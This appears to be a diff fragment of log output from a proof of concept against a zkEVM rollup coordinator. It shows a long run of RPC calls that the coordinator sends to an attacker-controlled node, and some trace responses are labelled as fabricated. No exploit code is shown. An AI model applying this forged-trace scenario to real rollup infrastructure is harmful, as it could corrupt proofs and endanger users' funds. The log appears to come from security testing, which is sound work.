+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
